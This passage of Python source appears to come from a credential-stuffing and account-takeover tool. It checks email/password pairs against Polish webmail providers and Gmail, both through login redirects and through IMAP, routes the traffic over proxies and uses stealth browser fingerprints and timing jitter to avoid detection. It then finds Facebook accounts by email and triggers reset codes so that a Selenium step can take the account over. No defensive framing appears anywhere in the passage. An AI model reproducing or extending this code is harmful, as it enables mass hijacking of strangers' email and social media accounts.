                return {"status": "unknown", "detail": f"http_{status_code}_no_redirect"}

            if status_code == 403:
                return {"status": "unknown", "detail": "blocked_by_waf"}
            if status_code == 429:
                return {"status": "unknown", "detail": "rate_limited"}

            return {"status": "unknown", "detail": f"http_{status_code}"}

        except Exception as e:
            err_str = str(e).lower()
            if "timeout" in err_str:
                log.warning(f"[HTTP] Timeout for {email} on {domain}")
                return {"status": "unknown", "detail": "timeout"}
            if "connection" in err_str:
                log.warning(f"[HTTP] Connection error for {email}: {e}")
                return {"status": "unknown", "detail": "connection_error"}
            log.warning(f"[HTTP] Error for {email}: {e}")
            return {"status": "unknown", "detail": str(e)[:100]}

    @staticmethod
    def _parse_wp_redirect(location: str, base_url: str, email: str,
                            proxy_url: str = None, parent_session=None,
                            profile: BrowserProfile = None) -> dict:
        """Parse WP/O2 login redirect Location header.

        Known patterns:
          .../w/...           -> logged in (inbox)
          ...#bad_login       -> invalid credentials
          .../b/pass-change   -> password change required
          .../b/block         -> account blocked / suspended
        """
        loc_lower = location.lower()

        # SUCCESS: redirect to inbox (/w/)
        if "/w/" in location:
            log.info(f"[HTTP] {email} -> SUCCESS (inbox redirect)")
            return {"status": "success", "detail": "logged_in"}

        # INVALID: #bad_login fragment (both WP and O2 use this)
        if "#bad_login" in location:
            log.info(f"[HTTP] {email} -> INVALID (bad_login)")
            return {"status": "invalid", "detail": "bad_login"}

        # PASS CHANGE
        if "/b/pass-change" in location or "pass-change" in loc_lower:
            log.info(f"[HTTP] {email} -> PASS_CHANGE")
            return {"status": "pass_change", "detail": "password_change_required"}

        # BLOCKED
        if "/b/block" in location or "/blocked" in loc_lower:
            log.info(f"[HTTP] {email} -> BLOCKED")
            return {"status": "blocked", "detail": "account_blocked"}

        # CAPTCHA / Turnstile challenge
        if "captcha" in loc_lower or "challenge" in loc_lower or "turnstile" in loc_lower:
            log.info(f"[HTTP] {email} -> CAPTCHA required")
            return {"status": "unknown", "detail": "captcha_required"}

        # Unknown redirect -- follow it using the same session (preserves cookies + fingerprint)
        try:
            follow_url = location
            if not location.startswith("http"):
                follow_url = base_url.rstrip("/") + "/" + location.lstrip("/")

            if parent_session:
                s = parent_session
            else:
                if not profile:
                    profile = generate_profile()
                s = create_stealth_session(profile, proxy_url)

            jitter_short()
            r = s.get(follow_url, allow_redirects=True, timeout=10)
            final_url = r.url
            log.info(f"[HTTP] {email} -> followed redirect to {final_url}")

            if "/w/" in final_url:
                return {"status": "success", "detail": "logged_in_after_redirect"}
            if "#bad_login" in final_url:
                return {"status": "invalid", "detail": "bad_login_after_redirect"}
            if "pass-change" in final_url:
                return {"status": "pass_change", "detail": "pass_change_after_redirect"}
            if "/b/block" in final_url or "/blocked" in final_url:
                return {"status": "blocked", "detail": "blocked_after_redirect"}
        except Exception as e:
            log.warning(f"[HTTP] {email} -> failed to follow redirect: {e}")

        log.warning(f"[HTTP] {email} -> unrecognized redirect: {location}")
        return {"status": "unknown", "detail": f"unrecognized_redirect: {location}"}

    @staticmethod
    def _check_email_imap(email: str, password: str, domain: str, proxy_url: str = None) -> dict:
        """IMAP login check. Works for WP/O2 (fallback), Interia, Onet, Gmail.
        When proxy_url is provided, tunnels TCP through SOCKS proxy."""
        import imaplib
        import ssl
        import socket as _socket

        imap_host = EngineManager._IMAP_SERVERS.get(domain)
        if not imap_host:
            return {"status": "unknown", "detail": f"no_imap_server_for_{domain}"}

        try:
            ctx = ssl.create_default_context()

            if proxy_url:
                # Tunnel IMAP through SOCKS/HTTP proxy using socket override
                sock = EngineManager._create_proxy_socket(proxy_url, imap_host, 993)
                if not sock:
                    log.warning(f"[IMAP] {email} -> proxy tunnel failed, trying direct")
                    conn = imaplib.IMAP4_SSL(imap_host, 993, timeout=10, ssl_context=ctx)
                else:
                    # Wrap with SSL then use IMAP4_stream-style init via _open_socket_override
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=imap_host)

                    class _ProxiedIMAP4(imaplib.IMAP4):
                        """IMAP4 that uses a pre-connected SSL socket."""
                        def _create_socket(self, timeout=None):
                            return ssl_sock
                        def open(self, host='', port=993, timeout=None):
                            self.host = host
                            self.port = port
                            self.sock = self._create_socket(timeout)
                            self.file = self.sock.makefile('rb')

                    conn = _ProxiedIMAP4(imap_host, 993)
                    log.info(f"[IMAP] {email} -> connected via proxy to {imap_host}")
            else:
                conn = imaplib.IMAP4_SSL(imap_host, 993, timeout=10, ssl_context=ctx)
            try:
                status, _ = conn.login(email, password)
                conn.logout()
                if status == "OK":
                    log.info(f"[IMAP] {email} -> SUCCESS")
                    return {"status": "success", "detail": "imap_login_ok"}
                return {"status": "unknown", "detail": f"imap_status_{status}"}
            except imaplib.IMAP4.error as e:
                err_msg = e.args[0] if isinstance(e.args[0], bytes) else str(e).encode()
                err_lower = err_msg.lower()

                # WP/O2 specific: "IMAP access disabled" ≠ bad password
                # Message: "auth failure or IMAP access disabled"
                imap_disabled_hints = [
                    b"aktywuj dostep przez imap",
                    b"imap access disabled",
                    b"enable imap",
                    b"imap is not enabled",
                    b"imap disabled",
                ]
                for hint in imap_disabled_hints:
                    if hint in err_lower:
                        log.info(f"[IMAP] {email} -> IMAP disabled on server")
                        return {"status": "unknown", "detail": "imap_disabled"}

                # WP combined message: "auth failure or IMAP access disabled"
                # This means we can't distinguish bad password from IMAP-off
                if b"auth failure or" in err_lower and b"imap" in err_lower:
                    log.info(f"[IMAP] {email} -> ambiguous (auth fail OR imap disabled)")
                    return {"status": "unknown", "detail": "imap_ambiguous_wp"}

                # Gmail specific
                if b"application-specific password" in err_lower or b"less secure app" in err_lower:
                    return {"status": "unknown", "detail": "imap_app_password_required"}

                # Clear auth failure (Interia, Onet, etc.)
                if b"authentication failed" in err_lower or b"login failed" in err_lower or b"invalid" in err_lower:
                    log.info(f"[IMAP] {email} -> INVALID (auth failed)")
                    return {"status": "invalid", "detail": "imap_auth_failed"}

                # Logowanie nie powiodlo sie (Polish: login failed)
                if b"logowanie nie powiodlo" in err_lower:
                    # For WP domains, this is ambiguous (could be IMAP disabled)
                    if domain in ("wp.pl", "o2.pl", "tlen.pl", "go2.pl"):
                        return {"status": "unknown", "detail": "imap_ambiguous_wp"}
                    return {"status": "invalid", "detail": "imap_auth_failed"}

                log.warning(f"[IMAP] {email} -> unrecognized error: {err_msg}")
                return {"status": "invalid", "detail": f"imap_auth_failed: {err_msg.decode(errors='replace')[:80]}"}
            except Exception as e:
                log.warning(f"[IMAP] {email} -> unexpected error: {e}")
                return {"status": "unknown", "detail": f"imap_unexpected: {str(e)[:80]}"}
            finally:
                try:
                    conn.logout()
                except Exception:
                    pass
        except Exception as e:
            log.warning(f"[IMAP] Connection failed for {domain} ({imap_host}): {e}")
            return {"status": "unknown", "detail": f"imap_connect_failed: {str(e)[:80]}"}

    # -- Facebook account lookup + reset code -------------------
    @staticmethod
    def _facebook_lookup_and_code(email: str, proxy_url: str = None,
                                   profile: BrowserProfile = None) -> dict:
        """Find FB account by email and request 8-digit reset code.
        
        Returns dict with 'status': code_sent / not_found / disabled / error
        All requests routed through proxy_url with consistent browser fingerprint.
        """
        import re
        from urllib.parse import quote

        if not profile:
            profile = generate_profile()

        session = create_stealth_session(profile, proxy_url)
        # Override for mbasic: use navigate headers
        session.headers.update(profile.base_headers(is_navigate=True))

        try:
            # Step 1: GET recover/identify page -> extract jazoest + lsd
            jitter_page()
            r1 = session.get(
                "https://mbasic.facebook.com/login/identify/"
                "?ctx=recover&search_attempts=0&alternate_search=0&toggle_search_mode=1",
                timeout=15,
            )
            body = r1.text

            jazoest_m = re.search(r'name="jazoest"\s+value="([^"]+)"', body)
            lsd_m = re.search(r'name="lsd"\s+value="([^"]+)"', body)
            if not jazoest_m or not lsd_m:
                return {"status": "error", "detail": "no_tokens"}

            jazoest = jazoest_m.group(1)
            lsd = lsd_m.group(1)

            # Step 2: POST search with email (simulate reading + typing)
            jitter_typing(len(email))
            post_headers = profile.base_headers(
                origin="https://mbasic.facebook.com",
                referer="https://mbasic.facebook.com/login/identify/",
                content_type="application/x-www-form-urlencoded",
            )
            post_headers["x-fb-lsd"] = lsd

            r2 = session.post(
                "https://mbasic.facebook.com/login/identify/"
                "?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login"
                "&alternate_search=0&show_friend_search_filtered_list=0"
                "&birth_month_search=0&city_search=0",
                data=f"lsd={lsd}&jazoest={jazoest}&email={email.lower()}&did_submit=Search",
                headers=post_headers,
                allow_redirects=True,
                timeout=15,
            )
            body2 = r2.text

            if "login_identify_search_error_msg" in body2:
                return {"status": "not_found", "detail": "email_not_found"}
            if "Account Disabled" in body2 or "Your account has been disabled" in body2:
                return {"status": "disabled", "detail": "account_disabled"}
            if "account_recovery_initiate_view_label" not in body2 and "cuid" not in body2:
                return {"status": "not_found", "detail": "no_account_match"}

            # Parse SMS info
            sms_info = ""
            sms_m = re.search(
                r'Send code via SMS</div><div class="_52jc _52j9">([^<]+)<', body2
            )
            if sms_m:
                import html as html_mod
                sms_info = html_mod.unescape(sms_m.group(1))

            # Step 3: GET initiate recovery page (simulate page reading delay)
            jitter_page()
            r3 = session.get(
                "https://mbasic.facebook.com/recover/initiate/"
                "?c=%2Flogin%2F&fl=initiate_view&ctx=msite_initiate_view",
                timeout=15,
            )
            body3 = r3.text

            if "Your request couldn't be processed" in body3 or "You're Temporarily Blocked" in body3:
                return {"status": "error", "detail": "rate_limited"}
            if "Account disabled" in body3:
                return {"status": "disabled", "detail": "account_disabled"}

            # Step 4: Request code via email (same session, same UA, same domain)
            jitter_short()
            r4 = session.get(
                f"https://mbasic.facebook.com/recover/code/"
                f"?em%5B0%5D={quote(email.lower())}&rm=send_email"
                f"&c=%2Flogin%2F&_rdr",
                timeout=15,
            )
            body4 = r4.text

            # Parse code digit count
            code_m = re.search(
                r'your code\.\s*Your code is\s*(\d+)\s*numbers?\s*long', body4
            )
            code_digits = code_m.group(1) if code_m else "8"

            # Return the final URL so Selenium can open the code-entry page
            fb_recover_url = str(r4.url) if hasattr(r4, 'url') else (
                f"https://mbasic.facebook.com/recover/code/"
                f"?em%5B0%5D={quote(email.lower())}&rm=send_email"
                f"&c=%2Flogin%2F&_rdr"
            )

            return {
                "status": "code_sent",
                "code_digits": code_digits,
                "sms": sms_info,
                "recover_url": fb_recover_url,
            }

        except Exception as e:
            err_str = str(e).lower()
            if "timeout" in err_str:
                return {"status": "error", "detail": "timeout"}
            log.warning(f"[FB] Error for {email}: {e}")
            return {"status": "error", "detail": str(e)[:120]}

    # -- worker lifecycle ---------------------------------------
    def _spawn_worker(self, entry: LogEntry) -> WorkerInfo:
        self._worker_id += 1
        w = WorkerInfo(
            id=self._worker_id,
            email=entry.email,
            os=random.choice(WORKER_OS_OPTIONS),
            log_id=entry.id,
            status="initializing",
        )
        self.workers.append(w)
        return w

    def _despawn_worker(self, wid: int):
        self.workers = [w for w in self.workers if w.id != wid]

    # -- queries ------------------------------------------------
    def get_workers(self) -> list:
        return [w.to_dict() for w in self.workers if w.status != "done"]

    def get_status(self) -> dict:
        return {
            "running": self.is_running,
            "concurrency": self.concurrency,
            "active_workers": len([w for w in self.workers if w.status != "done"]),
            "processed": self._processed,
            "uptime": int(time.time() - self._started_at) if self._started_at and self.is_running else 0,
            "ws_clients": len(self._ws_clients),
            "selenium_available": SELENIUM_AVAILABLE,
            "supported_providers": list(EMAIL_PROVIDERS.keys()) if SELENIUM_AVAILABLE else [],
        }
